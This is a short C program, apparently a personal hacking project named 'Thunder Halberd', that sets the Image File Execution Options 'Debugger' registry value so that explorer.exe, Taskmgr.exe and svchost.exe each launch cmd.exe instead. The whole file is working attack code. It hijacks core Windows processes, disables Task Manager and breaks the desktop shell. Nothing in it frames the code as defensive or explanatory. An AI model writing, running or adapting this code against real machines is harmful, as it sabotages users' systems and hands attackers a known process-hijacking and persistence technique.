/*
 * Projetct: Thunder Halberd
 * Purpose: hack a computer by image the Windows Explorer.
 * Start Date: 2017.10.03
 * Last edit date: 2017.10.04
 */

#include <stdio.h>
#include <windows.h>

LONG CreateRegKey(HKEY _hKey, LPCTSTR _subKey, LPCTSTR _KeyName, LPCTSTR _Name, LPCTSTR _KeyValue, int _KVLen){
  HKEY hKey;
  LONG result;

  /* Open the register */
  result = RegOpenKeyEx(_hKey, _subKey, 0, KEY_WRITE, &hKey);
  if (result != ERROR_SUCCESS) return result;

  /* Try to create the key */
  result = RegCreateKey(hKey, _KeyName, &hKey);
  if (result != ERROR_SUCCESS) return result;

  result = RegSetValueEx(hKey, _Name, 0, REG_SZ, _KeyValue, _KVLen);
  if (result != ERROR_SUCCESS) return result;

  /* Close the register */
  RegCloseKey(hKey);
  return 0;
}

LONG SetRegValue(HKEY _hKey, LPCTSTR _subKey, LPCTSTR _Name, LPCTSTR _KeyValue, int _KVLen){
  HKEY hKey;
  LONG result;

  /* Open the register */
  result = RegOpenKeyEx(_hKey, _subKey, 0, KEY_WRITE, &hKey);
  if (result != ERROR_SUCCESS) return result;

  /* Then image */
  result = RegSetValueEx(hKey, _Name, 0, REG_SZ, _KeyValue, _KVLen);
  if (result != ERROR_SUCCESS) return result;

  /* Close the register */
  RegCloseKey(hKey);
  return 0;
}

LONG ImageFile(LPCTSTR _FILE,LPCTSTR _IMAGE){
  char temp[128] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
  LPCTSTR data_Set = lstrcat(temp, _FILE);
  LONG result = SetRegValue(HKEY_LOCAL_MACHINE, data_Set, "Debugger", _IMAGE, lstrlen(_IMAGE));
  if (result != 0) {
    data_Set = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
    result = CreateRegKey(HKEY_LOCAL_MACHINE, data_Set, _FILE, "Debugger", _IMAGE, lstrlen(_IMAGE));
  }
  return result;
}

int main(int argc, char const *argv[]) {

/*
  LONG result;
  result = ImageFile("Taskmgr.exe", "cmd.exe");
  if (result != 0) {
    printf("%s\n", "Error!");
  }
*/
  ImageFile("explorer.exe", "cmd.exe");
  ImageFile("Taskmgr.exe", "cmd.exe");
  ImageFile("svchost.exe", "cmd.exe");
  return 0;
}
